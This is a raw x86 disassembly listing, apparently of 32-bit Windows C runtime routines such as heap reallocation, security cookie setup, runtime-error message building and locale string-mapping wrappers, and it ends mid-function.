  4257d1:	push   ebx
  4257d2:	call   0x426700
  4257d7:	add    esp,0x4
  4257da:	lea    ebp,[ebx+0x10]
  4257dd:	push   esi
  4257de:	push   ebx
  4257df:	call   0x426742
  4257e4:	add    esp,0x8
  4257e7:	lea    ecx,[esi+esi*2]
  4257ea:	push   0x1
  4257ec:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  4257f0:	call   0x4267d6
  4257f5:	mov    eax,DWORD PTR [edi+ecx*4]
  4257f8:	mov    DWORD PTR [ebx+0xc],eax
  4257fb:	call   DWORD PTR [edi+ecx*4+0x8]
  4257ff:	mov    edi,DWORD PTR [ebx+0x8]
  425802:	lea    ecx,[esi+esi*2]
  425805:	mov    esi,DWORD PTR [edi+ecx*4]
  425808:	jmp    0x4257ab
  42580a:	mov    eax,0x0
  42580f:	jmp    0x42582d
  425811:	mov    eax,0x1
  425816:	jmp    0x42582d
  425818:	push   ebp
  425819:	lea    ebp,[ebx+0x10]
  42581c:	push   0xffffffff
  42581e:	push   ebx
  42581f:	call   0x426742
  425824:	add    esp,0x8
  425827:	pop    ebp
  425828:	mov    eax,0x1
  42582d:	pop    ebp
  42582e:	pop    edi
  42582f:	pop    esi
  425830:	pop    ebx
  425831:	mov    esp,ebp
  425833:	pop    ebp
  425834:	ret    
  425835:	push   ebp
  425836:	mov    ecx,DWORD PTR [esp+0x8]
  42583a:	mov    ebp,DWORD PTR [ecx]
  42583c:	mov    eax,DWORD PTR [ecx+0x1c]
  42583f:	push   eax
  425840:	mov    eax,DWORD PTR [ecx+0x18]
  425843:	push   eax
  425844:	call   0x426742
  425849:	add    esp,0x8
  42584c:	pop    ebp
  42584d:	ret    0x4
  425850:	call   0x42375d
  425855:	add    eax,0x8
  425858:	ret    
  425859:	push   0x14
  42585b:	push   0x428770
  425860:	call   0x4238a8
  425865:	mov    edi,DWORD PTR [ebp+0x8]
  425868:	xor    ebx,ebx
  42586a:	cmp    edi,ebx
  42586c:	jne    0x42587c
  42586e:	push   DWORD PTR [ebp+0xc]
  425871:	call   0x4245d2
  425876:	pop    ecx
  425877:	jmp    0x425a00
  42587c:	mov    esi,DWORD PTR [ebp+0xc]
  42587f:	cmp    esi,ebx
  425881:	jne    0x42588f
  425883:	push   edi
  425884:	call   0x4244ba
  425889:	pop    ecx
  42588a:	jmp    0x4259fe
  42588f:	cmp    DWORD PTR ds:0x45d144,0x3
  425896:	jne    0x4259ca
  42589c:	mov    DWORD PTR [ebp-0x1c],ebx
  42589f:	cmp    esi,0xffffffe0
  4258a2:	ja     0x425999
  4258a8:	push   0x4
  4258aa:	call   0x423a6f
  4258af:	pop    ecx
  4258b0:	mov    DWORD PTR [ebp-0x4],ebx
  4258b3:	push   edi
  4258b4:	call   0x424c92
  4258b9:	pop    ecx
  4258ba:	mov    DWORD PTR [ebp-0x20],eax
  4258bd:	cmp    eax,ebx
  4258bf:	je     0x425969
  4258c5:	cmp    esi,DWORD PTR ds:0x45cf04
  4258cb:	ja     0x425919
  4258cd:	push   esi
  4258ce:	push   edi
  4258cf:	push   eax
  4258d0:	call   0x425192
  4258d5:	add    esp,0xc
  4258d8:	test   eax,eax
  4258da:	je     0x4258e1
  4258dc:	mov    DWORD PTR [ebp-0x1c],edi
  4258df:	jmp    0x425919
  4258e1:	push   esi
  4258e2:	call   0x425471
  4258e7:	pop    ecx
  4258e8:	mov    DWORD PTR [ebp-0x1c],eax
  4258eb:	cmp    eax,ebx
  4258ed:	je     0x425919
  4258ef:	mov    eax,DWORD PTR [edi-0x4]
  4258f2:	dec    eax
  4258f3:	mov    DWORD PTR [ebp-0x24],eax
  4258f6:	cmp    eax,esi
  4258f8:	jb     0x4258fc
  4258fa:	mov    eax,esi
  4258fc:	push   eax
  4258fd:	push   edi
  4258fe:	push   DWORD PTR [ebp-0x1c]
  425901:	call   0x4245f0
  425906:	push   edi
  425907:	call   0x424c92
  42590c:	mov    DWORD PTR [ebp-0x20],eax
  42590f:	push   edi
  425910:	push   eax
  425911:	call   0x424cbd
  425916:	add    esp,0x18
  425919:	cmp    DWORD PTR [ebp-0x1c],ebx
  42591c:	jne    0x425969
  42591e:	cmp    esi,ebx
  425920:	jne    0x425928
  425922:	xor    esi,esi
  425924:	inc    esi
  425925:	mov    DWORD PTR [ebp+0xc],esi
  425928:	add    esi,0xf
  42592b:	and    esi,0xfffffff0
  42592e:	mov    DWORD PTR [ebp+0xc],esi
  425931:	push   esi
  425932:	push   ebx
  425933:	push   DWORD PTR ds:0x45d140
  425939:	call   DWORD PTR ds:0x4280a8
  42593f:	mov    DWORD PTR [ebp-0x1c],eax
  425942:	cmp    eax,ebx
  425944:	je     0x425969
  425946:	mov    eax,DWORD PTR [edi-0x4]
  425949:	dec    eax
  42594a:	mov    DWORD PTR [ebp-0x24],eax
  42594d:	cmp    eax,esi
  42594f:	jb     0x425953
  425951:	mov    eax,esi
  425953:	push   eax
  425954:	push   edi
  425955:	push   DWORD PTR [ebp-0x1c]
  425958:	call   0x4245f0
  42595d:	push   edi
  42595e:	push   DWORD PTR [ebp-0x20]
  425961:	call   0x424cbd
  425966:	add    esp,0x14
  425969:	or     DWORD PTR [ebp-0x4],0xffffffff
  42596d:	call   0x4259c1
  425972:	cmp    DWORD PTR [ebp-0x20],ebx
  425975:	jne    0x425999
  425977:	cmp    esi,ebx
  425979:	jne    0x42597e
  42597b:	xor    esi,esi
  42597d:	inc    esi
  42597e:	add    esi,0xf
  425981:	and    esi,0xfffffff0
  425984:	mov    DWORD PTR [ebp+0xc],esi
  425987:	push   esi
  425988:	push   edi
  425989:	push   ebx
  42598a:	push   DWORD PTR ds:0x45d140
  425990:	call   DWORD PTR ds:0x4280b4
  425996:	mov    DWORD PTR [ebp-0x1c],eax
  425999:	mov    eax,DWORD PTR [ebp-0x1c]
  42599c:	cmp    eax,ebx
  42599e:	jne    0x425a00
  4259a0:	cmp    DWORD PTR ds:0x45cdc8,ebx
  4259a6:	je     0x425a00
  4259a8:	push   esi
  4259a9:	call   0x426192
  4259ae:	pop    ecx
  4259af:	test   eax,eax
  4259b1:	jne    0x42589c
  4259b7:	jmp    0x4259fe
  4259b9:	xor    ebx,ebx
  4259bb:	mov    esi,DWORD PTR [ebp+0xc]
  4259be:	mov    edi,DWORD PTR [ebp+0x8]
  4259c1:	push   0x4
  4259c3:	call   0x4239db
  4259c8:	pop    ecx
  4259c9:	ret    
  4259ca:	xor    eax,eax
  4259cc:	cmp    esi,0xffffffe0
  4259cf:	ja     0x4259e7
  4259d1:	cmp    esi,ebx
  4259d3:	jne    0x4259d8
  4259d5:	xor    esi,esi
  4259d7:	inc    esi
  4259d8:	push   esi
  4259d9:	push   edi
  4259da:	push   ebx
  4259db:	push   DWORD PTR ds:0x45d140
  4259e1:	call   DWORD PTR ds:0x4280b4
  4259e7:	cmp    eax,ebx
  4259e9:	jne    0x425a00
  4259eb:	cmp    DWORD PTR ds:0x45cdc8,ebx
  4259f1:	je     0x425a00
  4259f3:	push   esi
  4259f4:	call   0x426192
  4259f9:	pop    ecx
  4259fa:	test   eax,eax
  4259fc:	jne    0x4259ca
  4259fe:	xor    eax,eax
  425a00:	call   0x4238e3
  425a05:	ret    
  425a06:	push   0x10
  425a08:	push   0x428780
  425a0d:	call   0x4238a8
  425a12:	cmp    DWORD PTR ds:0x45d144,0x3
  425a19:	jne    0x425a55
  425a1b:	push   0x4
  425a1d:	call   0x423a6f
  425a22:	pop    ecx
  425a23:	and    DWORD PTR [ebp-0x4],0x0
  425a27:	mov    esi,DWORD PTR [ebp+0x8]
  425a2a:	push   esi
  425a2b:	call   0x424c92
  425a30:	pop    ecx
  425a31:	mov    DWORD PTR [ebp-0x1c],eax
  425a34:	test   eax,eax
  425a36:	je     0x425a43
  425a38:	mov    esi,DWORD PTR [esi-0x4]
  425a3b:	sub    esi,0x9
  425a3e:	mov    DWORD PTR [ebp-0x20],esi
  425a41:	jmp    0x425a46
  425a43:	mov    esi,DWORD PTR [ebp-0x20]
  425a46:	or     DWORD PTR [ebp-0x4],0xffffffff
  425a4a:	call   0x425a73
  425a4f:	cmp    DWORD PTR [ebp-0x1c],0x0
  425a53:	jne    0x425a68
  425a55:	push   DWORD PTR [ebp+0x8]
  425a58:	push   0x0
  425a5a:	push   DWORD PTR ds:0x45d140
  425a60:	call   DWORD PTR ds:0x4280b8
  425a66:	mov    esi,eax
  425a68:	mov    eax,esi
  425a6a:	call   0x4238e3
  425a6f:	ret    
  425a70:	mov    esi,DWORD PTR [ebp-0x20]
  425a73:	push   0x4
  425a75:	call   0x4239db
  425a7a:	pop    ecx
  425a7b:	ret    
  425a7c:	push   ebp
  425a7d:	mov    ebp,esp
  425a7f:	sub    esp,0x10
  425a82:	push   esi
  425a83:	lea    eax,[ebp-0x8]
  425a86:	push   eax
  425a87:	call   DWORD PTR ds:0x4280c8
  425a8d:	mov    esi,DWORD PTR [ebp-0x4]
  425a90:	xor    esi,DWORD PTR [ebp-0x8]
  425a93:	call   DWORD PTR ds:0x4280c4
  425a99:	xor    esi,eax
  425a9b:	call   DWORD PTR ds:0x428070
  425aa1:	xor    esi,eax
  425aa3:	call   DWORD PTR ds:0x4280c0
  425aa9:	xor    esi,eax
  425aab:	lea    eax,[ebp-0x10]
  425aae:	push   eax
  425aaf:	call   DWORD PTR ds:0x4280bc
  425ab5:	mov    eax,DWORD PTR [ebp-0xc]
  425ab8:	xor    eax,DWORD PTR [ebp-0x10]
  425abb:	xor    esi,eax
  425abd:	mov    DWORD PTR ds:0x45c430,esi
  425ac3:	jne    0x425acf
  425ac5:	mov    DWORD PTR ds:0x45c430,0xbb40e64e
  425acf:	pop    esi
  425ad0:	leave  
  425ad1:	ret    
  425ad2:	push   0x118
  425ad7:	push   0x428930
  425adc:	call   0x4238a8
  425ae1:	mov    eax,ds:0x45c430
  425ae6:	xor    eax,DWORD PTR [ebp+0x4]
  425ae9:	mov    DWORD PTR [ebp-0x1c],eax
  425aec:	mov    eax,ds:0x45cd98
  425af1:	xor    ecx,ecx
  425af3:	cmp    eax,ecx
  425af5:	je     0x425b16
  425af7:	mov    DWORD PTR [ebp-0x4],ecx
  425afa:	push   DWORD PTR [ebp+0xc]
  425afd:	push   DWORD PTR [ebp+0x8]
  425b00:	call   eax
  425b02:	pop    ecx
  425b03:	pop    ecx
  425b04:	or     DWORD PTR [ebp-0x4],0xffffffff
  425b08:	jmp    0x425c14
  425b0d:	xor    eax,eax
  425b0f:	inc    eax
  425b10:	ret    
  425b11:	mov    esp,DWORD PTR [ebp-0x18]
  425b14:	jmp    0x425b04
  425b16:	mov    eax,DWORD PTR [ebp+0x8]
  425b19:	dec    eax
  425b1a:	je     0x425b2f
  425b1c:	mov    edi,0x42890c
  425b21:	mov    DWORD PTR [ebp-0x20],0x428858
  425b28:	mov    esi,0xd4
  425b2d:	jmp    0x425b40
  425b2f:	mov    edi,0x428838
  425b34:	mov    DWORD PTR [ebp-0x20],0x428798
  425b3b:	mov    esi,0xb9
  425b40:	mov    BYTE PTR [ebp-0x24],cl
  425b43:	push   0x104
  425b48:	lea    eax,[ebp-0x128]
  425b4e:	push   eax
  425b4f:	push   ecx
  425b50:	call   DWORD PTR ds:0x428040
  425b56:	test   eax,eax
  425b58:	jne    0x425b6d
  425b5a:	push   0x42848c
  425b5f:	lea    eax,[ebp-0x128]
  425b65:	push   eax
  425b66:	call   0x423c90
  425b6b:	pop    ecx
  425b6c:	pop    ecx
  425b6d:	lea    ebx,[ebp-0x128]
  425b73:	lea    eax,[ebp-0x128]
  425b79:	push   eax
  425b7a:	call   0x423ec0
  425b7f:	pop    ecx
  425b80:	add    eax,0xb
  425b83:	cmp    eax,0x3c
  425b86:	jbe    0x425bb1
  425b88:	lea    eax,[ebp-0x128]
  425b8e:	push   eax
  425b8f:	call   0x423ec0
  425b94:	mov    ebx,eax
  425b96:	lea    eax,[ebp-0x128]
  425b9c:	sub    eax,0x31
  425b9f:	add    ebx,eax
  425ba1:	push   0x3
  425ba3:	push   0x428488
  425ba8:	push   ebx
  425ba9:	call   0x423d90
  425bae:	add    esp,0x10
  425bb1:	push   ebx
  425bb2:	call   0x423ec0
  425bb7:	pop    ecx
  425bb8:	lea    eax,[eax+esi*1+0xc]
  425bbc:	add    eax,0x3
  425bbf:	and    eax,0xfffffffc
  425bc2:	call   0x423900
  425bc7:	mov    DWORD PTR [ebp-0x18],esp
  425bca:	mov    esi,esp
  425bcc:	push   edi
  425bcd:	push   esi
  425bce:	call   0x423c90
  425bd3:	mov    edi,0x428468
  425bd8:	push   edi
  425bd9:	push   esi
  425bda:	call   0x423ca0
  425bdf:	push   0x42878c
  425be4:	push   esi
  425be5:	call   0x423ca0
  425bea:	push   ebx
  425beb:	push   esi
  425bec:	call   0x423ca0
  425bf1:	push   edi
  425bf2:	push   esi
  425bf3:	call   0x423ca0
  425bf8:	push   DWORD PTR [ebp-0x20]
  425bfb:	push   esi
  425bfc:	call   0x423ca0
  425c01:	push   0x12010
  425c06:	push   0x428440
  425c0b:	push   esi
  425c0c:	call   0x423b92
  425c11:	add    esp,0x3c
  425c14:	push   0x3
  425c16:	call   0x422d16
  425c1b:	int3   
  425c1c:	push   0x38
  425c1e:	push   0x428d50
  425c23:	call   0x4238a8
  425c28:	xor    ebx,ebx
  425c2a:	cmp    DWORD PTR ds:0x45cdbc,ebx
  425c30:	jne    0x425c6a
  425c32:	push   ebx
  425c33:	push   ebx
  425c34:	xor    esi,esi
  425c36:	inc    esi
  425c37:	push   esi
  425c38:	push   0x428d4c
  425c3d:	push   0x100
  425c42:	push   ebx
  425c43:	call   DWORD PTR ds:0x4280d4
  425c49:	test   eax,eax
  425c4b:	je     0x425c55
  425c4d:	mov    DWORD PTR ds:0x45cdbc,esi
  425c53:	jmp    0x425c6a
  425c55:	call   DWORD PTR ds:0x428014
  425c5b:	cmp    eax,0x78
  425c5e:	jne    0x425c6a
  425c60:	mov    DWORD PTR ds:0x45cdbc,0x2
  425c6a:	cmp    DWORD PTR [ebp+0x14],ebx
  425c6d:	jle    0x425c8a
  425c6f:	mov    ecx,DWORD PTR [ebp+0x14]
  425c72:	mov    eax,DWORD PTR [ebp+0x10]
  425c75:	dec    ecx
  425c76:	cmp    BYTE PTR [eax],bl
  425c78:	je     0x425c82
  425c7a:	inc    eax
  425c7b:	cmp    ecx,ebx
  425c7d:	jne    0x425c75
  425c7f:	or     ecx,0xffffffff
  425c82:	or     eax,0xffffffff
  425c85:	sub    eax,ecx
  425c87:	add    DWORD PTR [ebp+0x14],eax
  425c8a:	mov    eax,ds:0x45cdbc
  425c8f:	cmp    eax,0x2
  425c92:	je     0x425e74
  425c98:	cmp    eax,ebx
  425c9a:	je     0x425e74
  425ca0:	cmp    eax,0x1
  425ca3:	jne    0x425ea7
  425ca9:	xor    edi,edi
  425cab:	mov    DWORD PTR [ebp-0x1c],edi
  425cae:	mov    DWORD PTR [ebp-0x20],ebx
  425cb1:	mov    DWORD PTR [ebp-0x24],ebx
  425cb4:	cmp    DWORD PTR [ebp+0x20],ebx
  425cb7:	jne    0x425cc1
  425cb9:	mov    eax,ds:0x45cdb4
  425cbe:	mov    DWORD PTR [ebp+0x20],eax
  425cc1:	push   ebx
  425cc2:	push   ebx
  425cc3:	push   DWORD PTR [ebp+0x14]
  425cc6:	push   DWORD PTR [ebp+0x10]
  425cc9:	xor    eax,eax
  425ccb:	cmp    DWORD PTR [ebp+0x24],ebx
  425cce:	setne  al
  425cd1:	lea    eax,[eax*8+0x1]
  425cd8:	push   eax
  425cd9:	push   DWORD PTR [ebp+0x20]
  425cdc:	call   DWORD PTR ds:0x4280d0
  425ce2:	mov    esi,eax
  425ce4:	mov    DWORD PTR [ebp-0x28],esi
  425ce7:	cmp    esi,ebx
  425ce9:	je     0x425ea7
  425cef:	mov    DWORD PTR [ebp-0x4],0x1
  425cf6:	lea    eax,[esi+esi*1]
  425cf9:	add    eax,0x3
  425cfc:	and    eax,0xfffffffc
  425cff:	call   0x423900
  425d04:	mov    DWORD PTR [ebp-0x18],esp
  425d07:	mov    eax,esp
  425d09:	mov    DWORD PTR [ebp-0x2c],eax
  425d0c:	or     DWORD PTR [ebp-0x4],0xffffffff
  425d10:	jmp    0x425d2d
  425d12:	xor    eax,eax
  425d14:	inc    eax
  425d15:	ret    
  425d16:	mov    esp,DWORD PTR [ebp-0x18]
  425d19:	call   0x426d45
  425d1e:	xor    ebx,ebx
  425d20:	mov    DWORD PTR [ebp-0x2c],ebx
  425d23:	or     DWORD PTR [ebp-0x4],0xffffffff
  425d27:	mov    edi,DWORD PTR [ebp-0x1c]
  425d2a:	mov    esi,DWORD PTR [ebp-0x28]
  425d2d:	cmp    DWORD PTR [ebp-0x2c],ebx
  425d30:	jne    0x425d4e
  425d32:	lea    eax,[esi+esi*1]
  425d35:	push   eax
  425d36:	call   0x4245d2
  425d3b:	pop    ecx
  425d3c:	mov    DWORD PTR [ebp-0x2c],eax
  425d3f:	cmp    eax,ebx
  425d41:	je     0x425ea7
  425d47:	mov    DWORD PTR [ebp-0x20],0x1
  425d4e:	push   esi
  425d4f:	push   DWORD PTR [ebp-0x2c]
  425d52:	push   DWORD PTR [ebp+0x14]
  425d55:	push   DWORD PTR [ebp+0x10]
  425d58:	push   0x1
  425d5a:	push   DWORD PTR [ebp+0x20]
  425d5d:	call   DWORD PTR ds:0x4280d0
  425d63:	test   eax,eax
  425d65:	je     0x425e51
  425d6b:	push   ebx
  425d6c:	push   ebx
  425d6d:	push   esi
  425d6e:	push   DWORD PTR [ebp-0x2c]
  425d71:	push   DWORD PTR [ebp+0xc]
  425d74:	push   DWORD PTR [ebp+0x8]
  425d77:	call   DWORD PTR ds:0x4280d4
  425d7d:	mov    edi,eax
  425d7f:	mov    DWORD PTR [ebp-0x1c],edi
  425d82:	cmp    edi,ebx
  425d84:	je     0x425e51
  425d8a:	test   BYTE PTR [ebp+0xd],0x4
  425d8e:	je     0x425dbd
  425d90:	cmp    DWORD PTR [ebp+0x1c],ebx
  425d93:	je     0x425e51
  425d99:	cmp    edi,DWORD PTR [ebp+0x1c]
  425d9c:	jg     0x425e51
  425da2:	push   DWORD PTR [ebp+0x1c]
  425da5:	push   DWORD PTR [ebp+0x18]
  425da8:	push   esi
  425da9:	push   DWORD PTR [ebp-0x2c]
  425dac:	push   DWORD PTR [ebp+0xc]
  425daf:	push   DWORD PTR [ebp+0x8]
  425db2:	call   DWORD PTR ds:0x4280d4
  425db8:	jmp    0x425e51
  425dbd:	mov    DWORD PTR [ebp-0x4],0x2
  425dc4:	lea    eax,[edi+edi*1]
  425dc7:	add    eax,0x3
  425dca:	and    eax,0xfffffffc
  425dcd:	call   0x423900
  425dd2:	mov    DWORD PTR [ebp-0x18],esp
  425dd5:	mov    eax,esp
  425dd7:	mov    DWORD PTR [ebp-0x30],eax
  425dda:	or     DWORD PTR [ebp-0x4],0xffffffff
  425dde:	jmp    0x425dfb
  425de0:	xor    eax,eax
  425de2:	inc    eax
  425de3:	ret    
  425de4:	mov    esp,DWORD PTR [ebp-0x18]
  425de7:	call   0x426d45
  425dec:	xor    ebx,ebx
  425dee:	mov    DWORD PTR [ebp-0x30],ebx
  425df1:	or     DWORD PTR [ebp-0x4],0xffffffff
  425df5:	mov    edi,DWORD PTR [ebp-0x1c]
  425df8:	mov    esi,DWORD PTR [ebp-0x28]
  425dfb:	cmp    DWORD PTR [ebp-0x30],ebx
  425dfe:	jne    0x425e18
  425e00:	lea    eax,[edi+edi*1]
  425e03:	push   eax
  425e04:	call   0x4245d2
  425e09:	pop    ecx
  425e0a:	mov    DWORD PTR [ebp-0x30],eax
  425e0d:	cmp    eax,ebx
  425e0f:	je     0x425e51
  425e11:	mov    DWORD PTR [ebp-0x24],0x1
  425e18:	push   edi
  425e19:	push   DWORD PTR [ebp-0x30]
  425e1c:	push   esi
  425e1d:	push   DWORD PTR [ebp-0x2c]
  425e20:	push   DWORD PTR [ebp+0xc]
  425e23:	push   DWORD PTR [ebp+0x8]
  425e26:	call   DWORD PTR ds:0x4280d4
  425e2c:	test   eax,eax
  425e2e:	je     0x425e51
  425e30:	push   ebx
  425e31:	push   ebx
  425e32:	cmp    DWORD PTR [ebp+0x1c],ebx
  425e35:	jne    0x425e3b
  425e37:	push   ebx
  425e38:	push   ebx
  425e39:	jmp    0x425e41
  425e3b:	push   DWORD PTR [ebp+0x1c]
  425e3e:	push   DWORD PTR [ebp+0x18]
  425e41:	push   edi
  425e42:	push   DWORD PTR [ebp-0x30]
  425e45:	push   ebx
  425e46:	push   DWORD PTR [ebp+0x20]
  425e49:	call   DWORD PTR ds:0x428054
  425e4f:	mov    edi,eax
  425e51:	cmp    DWORD PTR [ebp-0x24],ebx
  425e54:	je     0x425e5f
  425e56:	push   DWORD PTR [ebp-0x30]
  425e59:	call   0x4244ba
  425e5e:	pop    ecx
  425e5f:	cmp    DWORD PTR [ebp-0x20],ebx
  425e62:	je     0x425e6d
  425e64:	push   DWORD PTR [ebp-0x2c]
  425e67:	call   0x4244ba
  425e6c:	pop    ecx
  425e6d:	mov    eax,edi
  425e6f:	jmp    0x425fcf
  425e74:	mov    DWORD PTR [ebp-0x34],ebx
  425e77:	xor    edi,edi
  425e79:	mov    DWORD PTR [ebp-0x38],ebx
  425e7c:	cmp    DWORD PTR [ebp+0x8],ebx
  425e7f:	jne    0x425e89
  425e81:	mov    eax,ds:0x45cda4
  425e86:	mov    DWORD PTR [ebp+0x8],eax
  425e89:	cmp    DWORD PTR [ebp+0x20],ebx
  425e8c:	jne    0x425e96
  425e8e:	mov    eax,ds:0x45cdb4
  425e93:	mov    DWORD PTR [ebp+0x20],eax
  425e96:	push   DWORD PTR [ebp+0x8]
  425e99:	call   0x426b2d
  425e9e:	pop    ecx
  425e9f:	mov    DWORD PTR [ebp-0x3c],eax
  425ea2:	cmp    eax,0xffffffff
  425ea5:	jne    0x425eae
  425ea7:	xor    eax,eax
  425ea9:	jmp    0x425fcf
  425eae:	cmp    eax,DWORD PTR [ebp+0x20]
  425eb1:	je     0x425fa5
  425eb7:	push   ebx
  425eb8:	push   ebx
  425eb9:	lea    ecx,[ebp+0x14]
  425ebc:	push   ecx
  425ebd:	push   DWORD PTR [ebp+0x10]
  425ec0:	push   eax
  425ec1:	push   DWORD PTR [ebp+0x20]
  425ec4:	call   0x426b76
  425ec9:	add    esp,0x18
  425ecc:	mov    DWORD PTR [ebp-0x34],eax
  425ecf:	cmp    eax,ebx
  425ed1:	je     0x425ea7
  425ed3:	push   ebx
  425ed4:	push   ebx
  425ed5:	push   DWORD PTR [ebp+0x14]
  425ed8:	push   eax
  425ed9:	push   DWORD PTR [ebp+0xc]
  425edc:	push   DWORD PTR [ebp+0x8]
  425edf:	call   DWORD PTR ds:0x4280cc
  425ee5:	mov    esi,eax
  425ee7:	mov    DWORD PTR [ebp-0x40],esi
  425eea:	cmp    esi,ebx
  425eec:	je     0x425f94
  425ef2:	mov    DWORD PTR [ebp-0x4],ebx
  425ef5:	add    eax,0x3
  425ef8:	and    eax,0xfffffffc
  425efb:	call   0x423900
  425f00:	mov    DWORD PTR [ebp-0x18],esp
  425f03:	mov    edi,esp
  425f05:	mov    DWORD PTR [ebp-0x44],edi
  425f08:	push   esi
  425f09:	push   ebx
  425f0a:	push   edi
  425f0b:	call   0x4261b0
  425f10:	add    esp,0xc
  425f13:	jmp    0x425f25
  425f15:	xor    eax,eax
  425f17:	inc    eax
  425f18:	ret    
  425f19:	mov    esp,DWORD PTR [ebp-0x18]
  425f1c:	call   0x426d45
  425f21:	xor    ebx,ebx
  425f23:	xor    edi,edi
  425f25:	or     DWORD PTR [ebp-0x4],0xffffffff
  425f29:	cmp    edi,ebx
  425f2b:	jne    0x425f50
  425f2d:	push   DWORD PTR [ebp-0x40]
  425f30:	call   0x4245d2
  425f35:	pop    ecx
  425f36:	mov    edi,eax
  425f38:	cmp    edi,ebx
  425f3a:	je     0x425f6d
  425f3c:	push   DWORD PTR [ebp-0x40]
  425f3f:	push   ebx
  425f40:	push   edi
  425f41:	call   0x4261b0
  425f46:	add    esp,0xc
  425f49:	mov    DWORD PTR [ebp-0x38],0x1
  425f50:	push   DWORD PTR [ebp-0x40]
  425f53:	push   edi
  425f54:	push   DWORD PTR [ebp+0x14]
  425f57:	push   DWORD PTR [ebp-0x34]
  425f5a:	push   DWORD PTR [ebp+0xc]
  425f5d:	push   DWORD PTR [ebp+0x8]
  425f60:	call   DWORD PTR ds:0x4280cc
  425f66:	mov    DWORD PTR [ebp-0x40],eax
  425f69:	cmp    eax,ebx
  425f6b:	jne    0x425f71
  425f6d:	xor    esi,esi
  425f6f:	jmp    0x425f97
  425f71:	push   DWORD PTR [ebp+0x1c]
  425f74:	push   DWORD PTR [ebp+0x18]
  425f77:	lea    eax,[ebp-0x40]
  425f7a:	push   eax
  425f7b:	push   edi
  425f7c:	push   DWORD PTR [ebp+0x20]
  425f7f:	push   DWORD PTR [ebp-0x3c]
  425f82:	call   0x426b76
  425f87:	add    esp,0x18
  425f8a:	mov    esi,eax
  425f8c:	neg    esi
  425f8e:	sbb    esi,esi
  425f90:	neg    esi
  425f92:	jmp    0x425f97
  425f94:	mov    esi,DWORD PTR [ebp-0x48]
  425f97:	cmp    DWORD PTR [ebp-0x38],ebx
  425f9a:	je     0x425fbf
  425f9c:	push   edi
  425f9d:	call   0x4244ba
  425fa2:	pop    ecx
  425fa3:	jmp    0x425fbf
  425fa5:	push   DWORD PTR [ebp+0x1c]
  425fa8:	push   DWORD PTR [ebp+0x18]
  425fab:	push   DWORD PTR [ebp+0x14]
  425fae:	push   DWORD PTR [ebp+0x10]
  425fb1:	push   DWORD PTR [ebp+0xc]
  425fb4:	push   DWORD PTR [ebp+0x8]
  425fb7:	call   DWORD PTR ds:0x4280cc
  425fbd:	mov    esi,eax
  425fbf:	cmp    DWORD PTR [ebp-0x34],ebx
  425fc2:	je     0x425fcd
  425fc4:	push   DWORD PTR [ebp-0x34]
  425fc7:	call   0x4244ba
  425fcc:	pop    ecx
  425fcd:	mov    eax,esi
  425fcf:	lea    esp,[ebp-0x54]
  425fd2:	call   0x4238e3
  425fd7:	ret    
  425fd8:	push   0x1c
  425fda:	push   0x428d78
  425fdf:	call   0x4238a8
  425fe4:	xor    esi,esi
  425fe6:	cmp    DWORD PTR ds:0x45cdc0,esi
  425fec:	jne    0x426023
  425fee:	lea    eax,[ebp-0x1c]
  425ff1:	push   eax
  425ff2:	xor    edi,edi
  425ff4:	inc    edi
  425ff5:	push   edi
  425ff6:	push   0x428d4c
  425ffb:	push   edi
  425ffc:	call   DWORD PTR ds:0x4280dc
  426002:	test   eax,eax
  426004:	je     0x42600e
  426006:	mov    DWORD PTR ds:0x45cdc0,edi
  42600c:	jmp    0x426023
  42600e:	call   DWORD PTR ds:0x428014
  426014:	cmp    eax,0x78
  426017:	jne    0x426023
  426019:	mov    DWORD PTR ds:0x45cdc0,0x2
  426023:	mov    eax,ds:0x45cdc0
  426028:	cmp    eax,0x2
  42602b:	je     0x42611b
  426031:	cmp    eax,esi
  426033:	je     0x42611b
  426039:	cmp    eax,0x1
  42603c:	jne    0x426141
  426042:	mov    DWORD PTR [ebp-0x20],esi
  426045:	mov    DWORD PTR [ebp-0x24],esi
  426048:	cmp    DWORD PTR [ebp+0x18],esi
  42604b:	jne    0x426055
  42604d:	mov    eax,ds:0x45cdb4
  426052:	mov    DWORD PTR [ebp+0x18],eax
  426055:	push   esi
  426056:	push   esi
  426057:	push   DWORD PTR [ebp+0x10]
  42605a:	push   DWORD PTR [ebp+0xc]
  42605d:	xor    eax,eax
  42605f:	cmp    DWORD PTR [ebp+0x20],esi
  426062:	setne  al
  426065:	lea    eax,[eax*8+0x1]
  42606c:	push   eax
  42606d:	push   DWORD PTR [ebp+0x18]
  426070:	call   DWORD PTR ds:0x4280d0
  426076:	mov    edi,eax
  426078:	mov    DWORD PTR [ebp-0x28],edi
  42607b:	test   edi,edi
  42607d:	je     0x426141
  426083:	and    DWORD PTR [ebp-0x4],0x0
  426087:	lea    ebx,[edi+edi*1]
  42608a:	mov    eax,ebx
  42608c:	add    eax,0x3
  42608f:	and    eax,0xfffffffc
  426092:	call   0x423900
  426097:	mov    DWORD PTR [ebp-0x18],esp
  42609a:	mov    esi,esp
  42609c:	mov    DWORD PTR [ebp-0x2c],esi
  42609f:	push   ebx
  4260a0:	push   0x0
  4260a2:	push   esi
  4260a3:	call   0x4261b0
  4260a8:	add    esp,0xc
  4260ab:	or     DWORD PTR [ebp-0x4],0xffffffff
  4260af:	jmp    0x4260c6
  4260b1:	xor    eax,eax
  4260b3:	inc    eax
  4260b4:	ret    
  4260b5:	mov    esp,DWORD PTR [ebp-0x18]
  4260b8:	call   0x426d45
  4260bd:	xor    esi,esi
  4260bf:	or     DWORD PTR [ebp-0x4],0xffffffff
  4260c3:	mov    edi,DWORD PTR [ebp-0x28]
  4260c6:	test   esi,esi
  4260c8:	jne    0x4260e1
  4260ca:	push   edi
  4260cb:	push   0x2
  4260cd:	call   0x4249c8
  4260d2:	pop    ecx
  4260d3:	pop    ecx
  4260d4:	mov    esi,eax
  4260d6:	test   esi,esi
  4260d8:	je     0x426141
  4260da:	mov    DWORD PTR [ebp-0x24],0x1
  4260e1:	push   edi
  4260e2:	push   esi
  4260e3:	push   DWORD PTR [ebp+0x10]
  4260e6:	push   DWORD PTR [ebp+0xc]
  4260e9:	push   0x1
  4260eb:	push   DWORD PTR [ebp+0x18]
  4260ee:	call   DWORD PTR ds:0x4280d0
  4260f4:	test   eax,eax
  4260f6:	je     0x426109
  4260f8:	push   DWORD PTR [ebp+0x14]
  4260fb:	push   eax
  4260fc:	push   esi
  4260fd:	push   DWORD PTR [ebp+0x8]
  426100:	call   DWORD PTR ds:0x4280dc
